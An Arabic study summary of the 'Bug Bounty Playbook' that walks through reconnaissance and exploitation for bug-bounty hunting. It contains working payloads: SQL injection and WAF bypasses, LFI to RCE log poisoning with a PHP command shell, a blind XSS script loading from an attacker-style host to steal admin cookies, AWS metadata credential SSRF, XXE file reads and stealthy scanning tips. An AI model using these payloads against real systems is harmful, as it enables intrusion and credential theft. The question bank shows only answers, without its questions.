1. مقدمة وهيكل الكتابين

كتاب **Bug Bounty Playbook** (بمجلديه الأول والثاني) يمثل أحد أبرز المراجع التقنية التطبيقية في مجتمع الأمن السيبراني. قام الكاتب **Alex Thomas (Ghostlulz)** بتقسيم العملية الأمنية إلى قسمين جوهريين:

  • المجلد الأول (Reconnaissance & Fingerprinting): يركز بشكل كامل على التجهيز والاستطلاع، وجمع أكبر قدر من المعلومات ورسم البنية الشبكية والخارجية للهدف.
  • المجلد الثاني (Exploitation Playbook): ينتقل إلى الجانب الهجومي الحقيقي واستغلال الثغرات وتحدي أنظمة جدار الحماية (WAF) للوصول إلى ثغرات بالغة الأثر مثل الحقن والتسريب والتحكم عن بعد بالخوادم.
أهمية دراسة المجلدين معاً: المجلد الأول يوفر لك الأهداف والمنافذ المنسية التي لا يفحصها أحد، بينما يمنحك المجلد الثاني التكتيكات البرمجية واليدوية لاستغلال تلك الأهداف وصناعة إثبات مفهوم قوي (PoC) يضمن لك الحصول على أعلى مكافأة مالية (Bounty).

2. المجلد 1: تجهيز البنية التحتية (Pre-Game)

يؤكد الكاتب أن صيد الثغرات بشكل احترافي يتطلب بيئة عمل مخصصة وسريعة تضمن استمرارية الفحص والتقاط الثغرات العمياء.

أ. سيرفر VPS والاستمرارية (24/7 Scanning)

الاعتماد على جهازك الشخصي يعوقك عن تشغيل الفحوصات الطويلة. يوصي الكاتب باستئجار خادم افتراضي خاص (VPS) مثل Linode أو DigitalOcean وتنصيب أدوات الاستطلاع عليه. لتجنب فقدان الجلسة عند إغلاق الجهاز، ينصح باستخدام أدوات إدارة النوافذ مثل screen أو tmux:

# بدء جلسة فحص مستمرة في الخلفية tmux new -s recon_session # تشغيل أداة الفحص ./my_recon_script.sh # للخروج من الجلسة مع بقائها تعمل: اضغط Ctrl+B ثم D # للعودة للجلسة لاحقاً: tmux attach -t recon_session

ب. إعداد خادم ونطاق الاستماع المخصص (OOB Setup)

لاكتشاف الثغرات العمياء (Blind Vulnerabilities)، تحتاج إلى تلقي اتصالات الراجع. يتم شراء نطاق مخصص (مثل `hunter-oob.com`) وتوجيه سجلات الـ Nameservers الخاصة به إلى سيرفر الـ VPS الخاص بك. يتم تنصيب خادم تفاعلي مثل interactsh-server أو acme-dns لالتقاط طلبات الـ DNS والـ HTTP والـ LDAP المرسلة من السيرفرات المصابة.

3. المجلد 1: استكشاف النطاقات الفرعية (Subdomain Enumeration)

يعتبر الكاتب عملية جمع النطاقات الفرعية هي النواة الأساسية لاكتشاف الثغرات. يتم الفحص عبر دمج آليات عديدة لضمان جمع كل نطاق ممكن.

أ. جمع النطاقات بالطرق السلبية (Passive Discovery)

الاستعلام من قواعد البيانات المفتوحة وشهادات SSL المؤرشفة. الأدوات الأساسية:

# جمع سلبي مدمج باستخدام مفاتيح API للأدوات الشهيرة subfinder -d target.com -all -recursive -o passive_subs.txt amass enum -passive -d target.com -o amass_subs.txt

ب. تخمين النطاقات بالطرق النشطة (Active Brute Forcing)

تخمين النطاقات بتوليد تركيبات أسماء ومقارنتها عبر خوادم DNS. يوصي الكاتب بفلترة قائمة خوادم الـ DNS أولاً لمنع النتائج الإيجابية الخاطئة (Wildcard DNS) باستخدام سكريبتات الفحص المسبق مثل `dnsvalidator`، ثم التخمين عالي السرعة:

# التخمين النشط باستخدام محللات DNS نظيفة puredns bruteforce wordlist.txt target.com -r trusted_resolvers.txt -o active_subs.txt

ج. توليد التبديلات والتعديلات (Subdomain Permutations)

صنع تنويعات من الأسماء المكتشفة للتخمين (مثل إضافة staging- أو -dev أو -test):

# توليد تنويعات وتخمينها مباشرة goaltdns -l subs.txt -w words.txt -o perm_subs.txt puredns resolve perm_subs.txt -r resolvers.txt -o valid_perms.txt

4. المجلد 1: المنافذ وتحديد المكونات (Fingerprinting)

بمجرد اكتمال قائمة النطاقات الفرعية، يجب معرفة من منها يقدم خدمات حقيقية وما هي هذه الخدمات.

أ. كشف النطاقات المستجيبة (Web Probing)

تصفية النطاقات التي تفتح منافذ ويب فعالة (80/443) واستخراج المعلومات الأساسية كأكواد الاستجابة وطول الصفحة:

cat all_subdomains.txt | httpx -sc -cl -title -td -o web_targets.txt

ب. فحص المنافذ بمقاييس ضخمة (Port Scanning at Scale)

استخدام أداة فائقة السرعة مثل masscan لفحص آلاف الخوادم والـ IPs المكتشفة، تليها أداة nmap لفحص تفصيلي للمنافذ المفتوحة فقط لتوفير الوقت:

# فحص سريع لجميع المنافذ بمعدل 1000 حزمة في الثانية masscan -iL ip_list.txt -p1-65535 --rate 1000 -oG masscan_raw.txt # تمرير المنافذ المفتوحة لنظام Nmap لفحص الإصدارات والـ Scripts التلقائية nmap -sV -sC -p [ports_discovered] -iL ip_list.txt -oA nmap_detailed

ج. التعرف على التقنيات (Technology Profiling)

استخدام أدوات الفحص البرمجي للتعرف على التقنيات المستخدمة خلف الكواليس (مثل إصدارات PHP أو IIS أو CMS أو مكتبات جافا سكريبت) لمعرفة ما إذا كانت تحتوي على ثغرات معروفة (CVEs):

whatweb -i web_targets.txt --aggression 3 -oG tech_profiles.txt

5. المجلد 1: البحث عن الملفات والنسخ الاحتياطية

تعتبر ملفات النسخ الاحتياطي ومجلدات التكوين المنسية أسرع طريق لاختراق خوادم الويب بالكامل.

أ. فحص المسارات الحساسة (Directory & File Fuzzing)

البحث عن مسارات غير معلنة للمستخدمين. يوصي الكاتب باستخدام أداة `ffuf` مع قائمة كلمات مدروسة ومكثفة (مثل قوائم `SecLists` المخصصة للـ Discovery) وتحديد امتدادات الملفات المناسبة للهدف:

ffuf -w directory_list.txt -u https://target.com/FUZZ -e .php,.asp,.html,.xml,.json,.txt -mc 200,301,302,403

ب. صيد ملفات التكوين والمجلدات المصدرية المنسية

ابحث دائماً عن الملفات التالية:

  • مجلدات التكوين البرمجي المفتوحة بالخطأ: .git/, .env, .svn/, .hg/
  • ملفات النسخ الاحتياطي للموقع والبيانات: backup.zip, config.php.bak, db.sql, project.tgz
  • ملفات إدارة الحزم والتنزيلات: composer.json, package.json, Dockerfile
فحص مجلدات الـ Git المفتوحة: إذا وجد سكريبت الاستطلاع مسار .git/ مفتوحاً، استخدم أداة مثل git-dumper لسحب المجلد بالكامل واستعادة الكود المصدري للموقع لقراءته وتحليله محلياً!

6. المجلد 2: ثغرات السيطرة (Subdomain Takeovers)

تعتبر من أسهل الثغرات وتحدث نتيجة إهمال في سجلات DNS للنطاق.

أ. فهم آلية استغلال CNAME dangling records

عندما تطلب شركة خدمة سحابية خارجية (مثل خوادم AWS S3)، تقوم بإنشاء سجل CNAME يشير من نطاقها الفرعي `test.target.com` إلى رابط السحابة `mybucket.s3.amazonaws.com`. إذا قامت الشركة بإلغاء حسابها على Amazon أو حذف الـ Bucket دون تحديث سجلات الـ DNS وحذف CNAME، يظل النطاق الفرعي يشير إلى مكان فارغ في Amazon. يمكن للمهاجم ببساطة إنشاء حساب على Amazon وحجز Bucket بنفس الاسم (`mybucket`) ليعرض أكواده الخبيثة مباشرة على النطاق الفرعي للشركة.

ب. قائمة بأبرز الخدمات وبصمات الأخطاء الخاصة بها

  • GitHub Pages: تظهر خطأ: There isn't a GitHub Pages site here.
  • Amazon S3: تظهر خطأ: NoSuchBucket - The specified bucket does not exist.
  • Heroku: تظهر خطأ: There's nothing here, yet.
  • Shopify: تظهر خطأ: Sorry, this shop is currently unavailable.

للفحص التلقائي السريع لمئات النطاقات:

subjack -w subs.txt -t 100 -o takeovers_output.txt -ssl -c fingerprints.json

7. المجلد 2: فحص واختراق الووردبريس و CMS

شرح لكيفية فحص واكتشاف ثغرات أنظمة إدارة المحتوى الشائعة.

أ. فحص الووردبريس الاحترافي

يتعدى الأمر مجرد البحث عن ثغرات عامة؛ يوصي الكاتب بتنفيذ فحص أمني دقيق للـ Plugins والـ Themes وتسريب أسماء المستخدمين:

wpscan --url https://wp-target.com --enumerate vp,vt,u --api-token YOUR_API_TOKEN

تكتيكات إضافية لووردبريس:

  • التحقق من ملفات التكوين المتروكة: wp-config.php.bak أو wp-config.old
  • استغلال واجهة الـ API العامة لتجميع اليوزرات: /wp-json/wp/v2/users
  • استغلال الـ XML-RPC: إرسال طلبات فحص تخميني لكلمات المرور مجمعة في طلب واحد (Multicall) لتجاوز حمايات الحظر (Brute-force bypass).

8. المجلد 2: حقن قواعد البيانات وتخطي WAF (SQLi)

تعد ثغرات SQLi من الثغرات ذات الأثر البالغ لأنها تسمح للمخترق بقراءة وتعديل قاعدة البيانات بالكامل.

أ. فحص الثغرة يدوياً (Manual Discovery)

ابدأ دائماً بإرسال علامات الاقتباس الفردية والمزدوجة ' أو " أو اختبارات المنطق الحسابية للتحقق من اضطراب استجابة الصفحة أو ظهور أخطاء SQL:

http://target.com/item.php?id=1' http://target.com/item.php?id=2-1 (إذا أعطت محتوى id=1 فالصفحة مصابة بحقن رقمي)

ب. استغلال ثغرات الحقن الأعمى (Blind SQLi Exploitation)

إذا كانت استجابة الصفحة ثابتة ولا تعرض أخطاء، يتم اللجوء إلى فحص الحقن الزمني (Time-Based) أو الحقن المنطقي (Boolean-Based):

# فحص حقن زمني في قاعدة بيانات MySQL http://target.com/item.php?id=1 AND IF(1=1, SLEEP(5), 0)

ج. تخطي حمايات جدار الحماية (WAF Bypass)

يوصي الكاتب باستخدام آليات التشويش والتغيير (Obfuscation) لتفادي الفلاتر التقليدية:

  • تغيير حالة الأحرف: sElEcT بدلاً من SELECT
  • استخدام تعليقات SQL المضمنة: /*!50000SELECT*/
  • استخدام الترميز الست عشري أو ترميز الـ URL المزدوج لتمرير الكلمات المفتاحية المحظورة.
  • استخدام نصوص تعديل المعاملات المدمجة في sqlmap (Tamper Scripts):
sqlmap -u "http://target.com/item.php?id=1" --tamper=space2comment,charencode --random-agent --dbms=mysql

9. المجلد 2: تضمين الملفات LFI/RFI و RCE

كيفية الانتقال من قراءة ملفات السيرفر الداخلية إلى تنفيذ أوامر نظام التشغيل بالكامل.

أ. ممرات المسار وتخطي الفلاتر (LFI Filters Bypass)

الوصول لملفات النظام في لينكس أو ويندوز:

http://target.com/read.php?file=../../../../etc/passwd # تجاوز حظر الفلاتر بالترميز المزدوج http://target.com/read.php?file=%252e%252e%252f%252e%252e%252fetc/passwd

ب. استخدام PHP Wrappers

استخراج ملفات الكود المصدري للموقع بشكل كامل بدلاً من تشغيلها على السيرفر:

http://target.com/read.php?file=php://filter/read=convert.base64-encode/resource=config.php

ج. الوصول للتحكم الكامل (LFI to RCE)

  • تسميم سجلات الخادم (Log Poisoning): حقن كود PHP خبيث داخل ترويسة الـ User-Agent عند الاتصال بالخادم، ثم استدعاء ملف سجلات الوصول الخاصة بأباتشي أو SSH لتنفيذ الكود:
    # حقن كود PHP في الـ User-Agent User-Agent: # ثم استدعاء السجل عبر ثغرة LFI لتنفيذ الأمر http://target.com/read.php?file=../../../../var/log/apache2/access.log&cmd=whoami
  • استغلال ملفات الجلسة (Session Poisoning): حقن بايلود PHP خبيث داخل متغيرات الجلسة، ثم استدعاء ملف الجلسة المخزن على السيرفر مثل /var/lib/php/sessions/sess_SESSIONID.

10. المجلد 2: ثغرات XSS (DOM & Blind) والـ CSRF

استهداف متصفح الضحية وسرقة جلساته وتغيير بيانات حسابه.

أ. ثغرات DOM-based XSS

تحدث بالكامل في جهة العميل (Client-Side). يجب تحليل كود الجافا سكريبت للبحث عن المصادر (Sources) والمصبات (Sinks):

  • المصادر (Sources): location.search, location.hash, document.referrer
  • المصبات (Sinks): innerHTML, eval(), document.write()

ب. ثغرات الـ XSS العمياء (Blind XSS)

حقن بايلود في أماكن لا تراها أنت (مثل لوحة تحكم الدعم الفني، نموذج الشكاوى). يوصي الكاتب باستخدام منصة استقبال متطورة ترسل لك تنبيهاً فورياً عند تشغيل الكود في متصفح الأدمن مع سحب الكوكيز وصورة لصفحة الأدمن:

# بايلود Blind XSS نمطي <script src="https://myxssplatform.com/log.js"></script>

ج. تجاوز حمايات الـ CSRF Tokens

إذا كان الموقع محمياً بـ Tokens، يوضح الكتاب تكتيكات تخطي الحماية:

  1. تغيير طريقة الطلب (Method Interchange): تحويل طلب POST إلى GET لعل الخادم لا يتحقق من الـ Token في طلبات GET.
  2. إرسال توكن فارغ أو إزالة المعامل بالكامل: اختبار ما إذا كان الخادم يتحقق فقط من وجود المعامل دون تدقيق قيمته.
  3. استخدام توكن حساب آخر: التحقق هل يقوم الخادم بربط الـ Token بجلسة المستخدم الحالي فعلياً أم أنه يقبل أي توكن صحيح لجلية أخرى.

11. المجلد 2: ثغرات SSRF و XML Entity (XXE)

استهداف الأنظمة الداخلية للشركات خلف الحمايات الخارجية.

أ. ثغرات الـ SSRF ومخاطر السحابة

استغلال الخادم الخارجي للاتصال بالخدمات الداخلية في بيئة السحابة (AWS, Google Cloud, Azure). الهدف الأكبر في بيئات السحاب هو قراءة ملفات الـ Cloud Metadata:

# جلب الـ IAM roles والـ Access Keys في AWS http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name

تجاوز فلاتر منع الـ IPs المحلية (مثل حظر 127.0.0.1) عبر:

  • التحويل للتمثيل العشري: http://2130706433 (والذي يحل لـ 127.0.0.1)
  • استخدام خوادم DNS Rebinding للتلاعب بقيم الـ TTL وتحويل الوجهة لعنوان محلي بعد الفحص الأولي.

ب. استغلال ثغرات XXE

حقن نصوص XML خبيثة لقراءة الملفات الداخلية للسيرفر:

<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>

12. المجلد 2: ثغرات التحكم بالوصول IDOR

التلاعب بالمعرفات لقراءة أو تعديل بيانات مستخدمين آخرين دون تصريح.

تكتيكات متقدمة لكشف ثغرات الـ IDOR

  • تغيير معرف المستخدم (ID Tampering): تلاعب بالـ parameters في الطلب: /api/user/101 بدلاً من /api/user/100.
  • تغيير نوع الطلب (HTTP Method Swapping): محاولة تغيير نوع الطلب من GET (للقراءة فقط) إلى POST أو PUT أو DELETE لعمل تعديل أو حذف لبيانات مستخدم آخر.
  • تجاوز معرفات الـ UUID: إذا كان التطبيق يستخدم معرفات عشوائية صعبة التخمين (UUID)، ابحث عن واجهات برمجية أخرى في التطبيق (مثل APIs البحث أو ملفات التعريف العامة) التي قد تسرب الـ UUID الخاص بالضحية، ثم استخدمه في الطلب المصاب بالـ IDOR.

13. المجلد 2: دمج الثغرات وكتابة التقارير الحيوية

تحويل الثغرات البسيطة لضربة قاضية أمنية لزيادة قيمة المكافأة المالية.

أ. دمج الثغرات (Vulnerability Chaining)

لا تتوقف عند إثبات وجود ثغرة بسيطة؛ فكر كيف يمكن استغلالها للوصول لثغرة أكبر. أمثلة للدمج الناجح:

  • CSRF + Stored XSS: استغلال ثغرة CSRF لحقن كود XSS مخزن داخل إعدادات بروفايل الضحية، مما يضمن تشغيل الكود بمجرد فتح البروفايل دون تدخل منه.
  • LFI + SSRF: استغلال ثغرة LFI لقراءة ملفات التكوين والوصول لمفاتيح الاستيقان (Tokens)، ثم استخدامها مع ثغرة SSRF للاتصال والسيطرة على الخدمات الداخلية للسيرفر.

ب. هيكل التقرير الأمني الذهبي

يكشف التقرير الاحترافي عن دقة الهكر وأثره التقني. الهيكل المعتمد في منصات HackerOne و Bugcrowd:

  1. Title: واضح ومحدد (مثل: IDOR in /api/edit_profile allows account takeover).
  2. Summary: نبذة مختصرة تلخص الثغرة والخطورة.
  3. Steps to Reproduce: خطوات واضحة ومرقمة بالتفصيل الممل لإعادة إنتاج الثغرة وتأكيدها.
  4. Impact: شرح فني وتجاري لمدى خطورة الثغرة على الشركة والمستخدمين.
  5. Remediation: نصائح للمطورين لإغلاق الثغرة بشكل صحيح.

14. بنك الأسئلة والاختبارات التفاعلية

🧪 بنك أسئلة مراجعة موسوعة Bug Bounty Playbook (انقر لعرض الإجابة النموذجية)
الإجابة النموذجية: ينصح الكتاب بتجنب الفحص العدواني المباشر (-A or -T5). بدلاً من ذلك، استخدم الفحص المتخفي (-sS)، وحدد وتيرة إرسال منخفضة (-T2 or -T3)، وقم بتغيير المنفذ المصدري للطلبات لجعلها تبدو كحركة مرور عادية (مثل استخدام المنفذ 53 أو 80 أو 443 عبر خيار --source-port)، وقم بتدوير عناوين الـ IP إن أمكن.
الإجابة النموذجية: لأن المهاجم يستطيع استضافة صفحة تصيد متكاملة لبيانات المستخدمين أو رفع ملفات خبيثة وتنزيلها تلقائياً على متصفح الزوار تحت اسم النطاق الرسمي والموثوق للشركة (مثل `login.target.com`). هذا يسهل سرقة كوكيز المستخدمين لأن متصفحاتهم سترسلها تلقائياً بسبب سياسة المصدر نفسه (Same-Origin Policy).
الإجابة النموذجية: نقوم بحقن دالة شرطية زمنية (مثل `AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)`). إذا تأخر رد السيرفر لمدة 5 ثوانٍ، فهذا يؤكد أن الحرف الأول من اسم قاعدة البيانات هو 'a'. نقوم بتكرار العملية لتخمين الحروف بالتتابع يدوياً أو كتابة سكريبت بايثون بسيط لأتمتة العملية.
الإجابة النموذجية: نرسل طلب HTTP ملوثاً بكود PHP خبيث في حقل الـ User-Agent (مثل `<?php system($_GET['cmd']); ?>`). سيقوم السيرفر بحفظ هذا الطلب في ملف سجلات الوصول `access.log`. بعد ذلك نقوم باستدعاء ملف السجلات هذا عبر ثغرة LFI مع تمرير الأمر المطلوب تشغيله في الـ parameter (مثل `&cmd=id`)، ليقوم مفسر PHP بتشغيل البايلود وعرض النتائج.
الإجابة النموذجية: هو هجوم يجبر متصفح الضحية على إرسال طلبات حساسة ومصرحة لموقع ما مستغلاً وجود كوكيز الجلسة نشطة. تتم الحماية الفعالة عبر تطبيق حمايات الـ **Anti-CSRF Tokens** الفريدة والصالحة لمرة واحدة وربطها بالجلسة، بالإضافة إلى تفعيل ميزة **SameSite Cookie Attribute** وضبطها على قيمة `Lax` أو `Strict` لمنع إرسال الكوكيز مع الطلبات الواردة من مواقع خارجية.
الإجابة النموذجية: المهاجم يملك خادم DNS ونطاقاً خاصاً. عندما يقوم السيرفر المستهدف بعمل Resolve للنطاق للتحقق من أمان الـ IP، يعود خادم الـ DNS الخاص بنا بـ IP عام مسموح به (بـ TTL=0). بمجرد قبول الفحص، يرسل السيرفر الطلب الفعلي، فيقوم المتصفح أو السيرفر بعمل Resolve مجدداً للنطاق، وهنا يعود خادم الـ DNS بـ IP محلي (127.0.0.1)، فيتصل السيرفر بنفسه داخلياً ويتم استغلال الـ SSRF.
الإجابة النموذجية: واجهات الـ APIs كثيراً ما تعتمد على معرفات مرقمة أو صريحة في الـ URL أو في الـ Request Body (مثل `/api/v1/billing/1005`). إذا لم يقم المطور بإجراء عمليات تحقق خلفية صارمة تتأكد من أن المستخدم صاحب الجلسة يملك حق الصلاحية والوصول الفعلي للسجل رقم `1005` بالذات، فسيتمكن أي مستخدم آخر من سحب وتعديل فواتير وبيانات الآخرين بمجرد تلاعب رقمي بالطلب.
